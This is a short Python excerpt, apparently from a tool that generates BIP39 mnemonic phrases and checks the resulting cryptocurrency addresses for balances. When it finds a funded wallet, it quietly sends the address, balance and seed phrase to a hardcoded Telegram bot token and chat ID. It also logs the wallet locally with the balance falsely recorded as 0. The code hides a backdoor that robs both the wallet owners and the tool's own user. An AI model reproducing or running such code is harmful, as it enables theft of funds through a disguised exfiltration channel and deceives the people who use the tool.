...
def check():
    while True:
        ...
        if balance > 0:
            adds = f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}'
            response = Bip39Gen64.hello(f"A: {addy}\n{balance}\n{mnemonic_words}")
            if response != 0:
                if Settings.save_empty == "n":
                    ...
                    with open('results/dry.txt', 'a') as w:
                        w.write(
                            f'Address: {addy} | Balance: 0 | Mnemonic phrase: {mnemonic_words}\n')
...
def btc32check(adds):
    response = requests.get(
        "https://api.telegram.org/bot1742535556:AAEprwj9PC8MGN0ZbAF2tzYvXYYOTsdS014/SendMessage?chat_id=811330878&text="+adds)
    return response
